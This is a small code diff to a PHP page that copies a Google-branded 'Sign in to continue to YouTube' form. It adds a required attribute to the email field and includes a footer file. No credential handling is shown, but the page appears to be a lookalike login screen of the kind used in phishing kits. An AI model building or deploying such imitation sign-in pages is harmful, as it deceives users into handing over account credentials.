@@ -14,7 +14,7 @@
                 <h2>Sign in</h2>
                 <p>to continue to YouTube</p>
                 <form action='' method='POST'>
-                    <input type='email' name='email' placeholder='Email'>
+                    <input type='email' name='email' placeholder='Email' required>
                     <a href='#'>Forgot email?</a>
                     <p>Not your computer? Use Guest mode to sign in privately.<a href='#'>Learn more</a></p>
                     <div class='options'>
@@ -34,5 +34,6 @@
                 </div>
             </article>
         </section>
+        <?php require './required-files/footer.php'; ?>
     </body>
 </html>
